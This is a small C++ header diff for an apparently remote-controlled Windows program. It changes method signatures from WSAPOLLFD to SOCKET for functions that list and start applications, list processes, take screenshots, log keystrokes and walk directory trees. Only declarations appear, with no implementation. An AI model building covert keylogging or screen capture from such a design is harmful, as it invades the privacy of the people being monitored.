@@ -23,17 +23,17 @@ public:
 
     void start();
     
-    int listApp(WSAPOLLFD& fd);
-    int startApp(const char* appName, WSAPOLLFD& fd);
-    int stopApp(const char* appName, WSAPOLLFD& fd);
+    int listApp(SOCKET& fd);
+    int startApp(const char* appName, SOCKET& fd);
+    int stopApp(const char* appName, SOCKET& fd);
 
-    int listProcess(WSAPOLLFD& fd);
+    int listProcess(SOCKET& fd);
 
-    int screenShot(WSAPOLLFD& fd);
+    int screenShot(SOCKET& fd);
 
-    int keyLog(WSAPOLLFD& fd);
+    int keyLog(SOCKET& fd);
 
-    int dirTree(WSAPOLLFD& fd); 
+    int dirTree(SOCKET& fd); 
 };
 
 DWORD GetProcessIdByName(const char* processName);
